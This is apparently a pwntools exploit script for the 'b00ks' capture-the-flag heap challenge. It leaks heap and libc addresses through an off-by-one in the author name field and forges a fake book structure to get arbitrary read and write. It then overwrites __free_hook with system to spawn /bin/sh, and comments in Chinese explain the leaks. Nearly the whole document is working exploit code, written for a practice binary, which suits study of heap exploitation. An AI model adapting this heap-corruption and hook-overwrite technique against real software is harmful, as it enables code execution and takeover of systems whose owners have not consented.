#echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
#echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p       = process('./b00ks')
elf     = ELF('./b00ks')
libc    = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def hello():
    p.sendlineafter('Enter author name: ', 'tuto')
    
def create(name_size, name, book_size, book):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil('Enter book name size: ')
    p.sendline(name_size)
    p.recvuntil('Enter book name (Max 32 chars): ')
    p.send(name)
    p.recvuntil('Enter book description size: ')
    p.sendline(book_size)
    p.recvuntil('Enter book description: ')
    p.send(book)
def delete(index):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil('Enter the book id you want to delete: ')
    p.sendline(index)
def edit_book(index, book):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil('Enter the book id you want to edit: ')
    p.sendline(index)
    p.recvuntil('Enter new book description: ')
    p.send(book)
def show():
    p.recvuntil('> ')
    p.sendline('4')
def edit_author(name):
    p.recvuntil('> ')
    p.sendline('5')
    p.recvuntil('Enter author name: ')
    p.sendline(name)

hello()
edit_author('a' * 32)
create('16', 'b' * 16, '240', 'c' * 240)
create('135168', 'd\n', '135168', 'e\n')

# 泄露堆的地址
show()
p.recvuntil('Author: ' + 'a' * 32)
book2_des   = u64(p.recv(6).ljust(8, b'\x00')) - 0x10 + 0x30 + 0x10 + 0x10 # 3d0
book2_name  = book2_des - 0x8

# 伪造book1, 使得fake_name指向book2的name, fake_des指向book2的des
payload  = b'a' * 0x30
payload += p64(0x1) + p64(book2_des) + p64(book2_name) + p64(0xffff) + b'\n'
edit_book('1', payload)
edit_author('a' * 32)

show()
p.recvuntil('Name: ')
libc_base   = u64(p.recv(6).ljust(8, b'\x00')) - 0x381010 + 0x22000
binsh       = libc_base + next(libc.search(b'/bin/sh\x00'))
system      = libc_base + libc.sym['system']
free_hook   = libc_base + libc.sym['__free_hook']
print('libc_base = ' + hex(libc_base))
print('system = ' + hex(system))
print('__free_hook = ' + hex(free_hook))
print('binsh = ' + hex(binsh))


payload = p64(binsh) + p64(free_hook) + b'\n'
edit_book('1', payload)
payload = p64(system) + b'\n'
edit_book('2', payload)
gdb.attach(p)
delete('2')

p.interactive()
